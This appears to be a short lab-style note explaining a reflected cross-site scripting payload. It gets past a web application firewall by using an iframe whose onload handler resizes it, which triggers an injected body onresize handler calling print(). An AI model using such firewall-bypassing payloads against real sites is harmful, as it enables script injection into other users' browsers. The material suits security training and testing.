The following  bypasses the WAF because it uses uncommon tags and attributes.
After that, the iframe's `onload` event resizes the element with `this.style.width=100` so `onresize` event gets triggered.
``` javascript
<iframe src="URL/?search=<body onresize=print()>" onload=this.style.width=100>
```